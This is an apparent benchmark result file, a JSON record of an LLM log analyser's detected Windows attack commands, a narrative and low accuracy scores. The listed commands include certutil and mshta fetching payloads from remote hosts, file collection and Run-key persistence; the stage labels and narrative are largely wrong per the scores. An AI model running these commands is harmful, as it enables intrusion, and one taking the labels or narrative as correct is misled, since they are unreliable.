@@ -1,0 +1,138 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "psexec.exe C:\\\\\\\\\\\test.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "net use * \\127.0.0.1\\Share /persistent:no",
+        "stage": "Persistence"
+      },
+      {
+        "command": "certutil -encode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start powershell&REM \\system32\\cleanmgr.exe /autoclean /d C:",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "CertUtil -decode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sc delete <service_name> /force",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://SERVER-IP.COM/CLEANUP.bat C:/tmp/CLEANUP.bat",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Documents\\shellcode.ico",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "reg add HKCU\\SOFTWARE\\MICROSOFT\\WINDOW\\CURRENTVERSION\\RUN /v \"<filename>.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://SERVER-IP.COM/install_dll.exe C:/tmp/install_dll.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/msxslscript.xsl",
+        "stage": "Collection"
+      },
+      {
+        "command": "net stop wuauserv && dir c:\\Windows\\SoftwareDistribution > C:\\Users\\Public\\desktop\\files.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://SERVER-IP.COM/update_dll.exe C:/tmp/update_dll.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1220 ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /c rmdir /s /q C:\\Users\\Shares",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://SERVER-IP.COM/drain_dll.exe C:/tmp/drain_dll.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "This analysis found several indicators of potential malicious activity on the target system. The threat actor appears to have exploited multiple vulnerabilities to gain initial access to the system. They executed PowerShell scripts to carry out various attacks, including persistence through registry modifications, privilege escalation via service manipulation, defense evasion using utilities like CertUtil and Reg, and collection of sensitive information via search queries. Furthermore, they appear to have been using tools such as Mimikatz and Procdump to extract and manipulate files on the system. Additionally, there were signs of lateral movement as evidenced by the establishment of new connections to remote servers.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235933,
+      "completion_tokens": 5751,
+      "total_tokens": 241684,
+      "wall_clock_s": 75.13,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.045454545454545456,
+      "recall": 0.07142857142857142,
+      "f1": 0.05555555555555555,
+      "tp": 1,
+      "fp": 21,
+      "fn": 13
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 22,
+      "fn": 14,
+      "recall_partial": 0.03571428571428571
+    },
+    "hallucination_rate": 0.4166666666666667,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235933,
+      "completion_tokens": 5751,
+      "total_tokens": 241684,
+      "wall_clock_s": 75.13,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
